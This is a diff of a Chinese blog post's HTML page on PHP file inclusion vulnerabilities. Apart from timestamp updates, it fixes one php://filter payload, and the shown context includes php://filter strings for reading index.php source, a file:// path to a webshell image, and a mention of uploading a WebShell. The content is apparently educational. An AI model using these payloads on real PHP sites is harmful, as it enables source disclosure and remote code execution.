@@ -105,7 +105,7 @@
 <meta property="og:description" content="1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://chirec.github.io/2019/04/22/File-Inclusion/5.6.01.php-protocol.png">
-<meta property="og:updated_time" content="2019-07-04T11:21:08.857Z">
+<meta property="og:updated_time" content="2019-07-13T13:44:26.023Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;文件包含总结&#39;">
 <meta name="twitter:description" content="1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。">
@@ -393,7 +393,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-04 19:21:08" itemprop="dateModified" datetime="2019-07-04T19:21:08+08:00">2019-07-04</time>
+                <time title="Modified: 2019-07-13 21:44:26" itemprop="dateModified" datetime="2019-07-13T21:44:26+08:00">2019-07-13</time>
               
             
           </span>
@@ -461,7 +461,7 @@
 <p>直接上传WebShell</p>
 <h2 id="5-2-php-filter"><a href="#5-2-php-filter" class="headerlink" title="5.2 php://filter"></a>5.2 php://filter</h2><p>条件：无</p>
 <p>读取文件中的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/string.str_rot13/resource=index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/string.rot13/resource=index.php</span><br></pre></td></tr></table></figure>
 <h2 id="5-3-file"><a href="#5-3-file" class="headerlink" title="5.3 file://"></a>5.3 file://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://d:/phpstudy/www/webshell.jpg</span><br></pre></td></tr></table></figure>
 <p>可以解析</p>
 <h2 id="5-4-phar"><a href="#5-4-phar" class="headerlink" title="5.4 phar://"></a>5.4 phar://</h2><p>条件：php版本&gt;=5.3.0<br>info.txt --&gt;打包成zip文件<br>相对路径</p>
